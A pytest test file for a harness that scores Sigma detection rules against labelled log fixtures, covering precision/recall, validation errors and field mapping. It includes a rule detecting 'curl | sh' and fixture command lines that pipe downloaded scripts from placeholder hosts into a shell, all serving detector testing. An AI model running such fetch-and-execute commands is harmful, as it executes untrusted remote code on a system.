import json
from pathlib import Path

import pytest

from sigharness.corpus import CorpusError, FieldMapping, load_corpus
from sigharness.rules import load_rule, load_rules
from sigharness.scoring import FN, FP, IGNORED, TN, TP, run

RULE = """
title: Curl piped to shell
id: 11111111-1111-4111-8111-111111111111
name: curl_pipe_shell
status: test
level: high
logsource: {product: linux, category: process_creation}
detection:
  sel: {CommandLine|contains|all: ['curl ', '| sh']}
  filter: {ParentImage|endswith: '/opt/ci/runner'}
  condition: sel and not filter
"""

OTHER = """
title: Okta MFA factor reset
id: 22222222-2222-4222-8222-222222222222
logsource: {product: okta, service: okta}
detection:
  sel: {eventType: user.mfa.factor.reset_all}
  condition: sel
"""


def write(tmp: Path, name: str, text: str) -> Path:
    p = tmp / name
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(text)
    return p


def corpus(tmp: Path, rows: list[dict]) -> Path:
    return write(tmp, "corpus/c.jsonl", "\n".join(json.dumps(r) for r in rows))


LX = {"product": "linux", "category": "process_creation"}


def setup(tmp, rows):
    write(tmp, "rules/curl.yml", RULE)
    write(tmp, "rules/okta.yml", OTHER)
    return load_rules([tmp / "rules"]), load_corpus([corpus(tmp, rows)])


def test_confusion_matrix_and_label_aliases(tmp_path):
    rows = [
        {"id": "a1", "logsource": LX, "expect": ["curl_pipe_shell"],
         "event": {"CommandLine": "curl https://x.example/i | sh", "ParentImage": "/bin/bash"}},
        {"id": "a2", "logsource": LX, "expect": ["curl"],  # file stem alias
         "event": {"CommandLine": "curl https://x.example/i | bash", "ParentImage": "/bin/bash"}},
        {"id": "b1", "logsource": LX, "note": "CI bootstrap, filtered",
         "event": {"CommandLine": "curl https://get.example | sh", "ParentImage": "/opt/ci/runner"}},
        {"id": "b2", "logsource": LX, "event": {"CommandLine": "curl -o x | sh -n", "ParentImage": "/bin/zsh"}},
        {"id": "b3", "logsource": LX, "ignore": ["11111111-1111-4111-8111-111111111111"],
         "event": {"CommandLine": "curl a | sh", "ParentImage": "/bin/zsh"}},
        {"id": "o1", "logsource": {"product": "okta", "service": "okta"},
         "event": {"eventType": "user.session.start"}},
    ]
    rules, fx = setup(tmp_path, rows)
    res = run(rules, fx).by_id()
    s = res["11111111-1111-4111-8111-111111111111"]
    assert s.outcomes == {"a1": TP, "a2": FN, "b1": TN, "b2": FP, "b3": IGNORED}
    assert (s.tp, s.fp, s.fn, s.tn) == (1, 1, 1, 1)
    assert s.precision == 0.5 and s.recall == 0.5
    assert not s.passed
    okta = res["22222222-2222-4222-8222-222222222222"]
    assert okta.outcomes == {"o1": TN}  # logsource routing: linux events not evaluated
    assert any("no positive fixture" in w for w in okta.warnings)


def test_unknown_label_is_an_error_not_a_silent_negative(tmp_path):
    rows = [{"id": "x", "logsource": LX, "expect": ["curl_pipe_shel"], "event": {}}]
    with pytest.raises(CorpusError, match="unknown rule"):
        run(*setup(tmp_path, rows))


def test_expecting_rule_on_wrong_logsource_is_an_error(tmp_path):
    rows = [{"id": "x", "logsource": {"product": "windows"}, "expect": ["curl"], "event": {}}]
    with pytest.raises(CorpusError, match="does not apply"):
        run(*setup(tmp_path, rows))


@pytest.mark.parametrize("line,msg", [
    ('{"logsource": {"a": "b"}, "event": {}}', "needs a string 'id'"),
    ('{"id": "1", "event": {}}', "logsource"),
    ('{"id": "1", "logsource": {"a": "b"}, "event": []}', "'event' must be"),
    ('{"id": "1", "logsource": {"a": "b"}, "event": {}, "expect": "r"}', "list of rule"),
    ('{"id": "1", "logsource": {"a": "b"}, "event": {}, "expcet": []}', "unknown keys"),
    ('{"id": "1", "logsource": {"a": "b"}, "event": {}, "expect": ["r"], "ignore": ["r"]}', "both"),
    ('not json', "invalid JSON"),
])
def test_corpus_validation(tmp_path, line, msg):
    p = write(tmp_path, "c.jsonl", line)
    with pytest.raises(CorpusError, match=msg):
        load_corpus([p])


def test_duplicate_fixture_ids_rejected(tmp_path):
    row = '{"id": "1", "logsource": {"a": "b"}, "event": {}}'
    p = write(tmp_path, "c.jsonl", row + "\n" + row)
    with pytest.raises(CorpusError, match="duplicate"):
        load_corpus([p])


def test_field_mapping_lets_sigma_names_read_vendor_fields(tmp_path):
    write(tmp_path, "rules/okta.yml", OTHER)
    m = write(tmp_path, "map.yml", "mappings:\n  - logsource: {product: okta}\n"
                                   "    fields: {eventType: event.type}\n")
    rows = [{"id": "o1", "logsource": {"product": "okta", "service": "okta"},
             "expect": ["22222222-2222-4222-8222-222222222222"],
             "event": {"event": {"type": "user.mfa.factor.reset_all"}}}]
    rules = load_rules([tmp_path / "rules"])
    fx = load_corpus([corpus(tmp_path, rows)])
    assert run(rules, fx).scores[0].outcomes == {"o1": FN}
    assert run(rules, fx, FieldMapping.load(m)).scores[0].outcomes == {"o1": TP}


def test_unsupported_rule_is_reported_not_scored(tmp_path):
    p = write(tmp_path, "rules/agg.yml", RULE.replace("condition: sel and not filter",
                                                     "condition: sel | count() > 5"))
    r = load_rule(p)
    assert not r.supported and "aggregation" in r.error
    s = run([r], []).scores[0]
    assert s.outcomes == {} and s.warnings[0].startswith("unsupported") and not s.passed


def test_duplicate_rule_ids_rejected(tmp_path):
    write(tmp_path, "rules/a.yml", RULE)
    write(tmp_path, "rules/b.yml", RULE)
    with pytest.raises(Exception, match="duplicate rule id"):
        load_rules([tmp_path / "rules"])
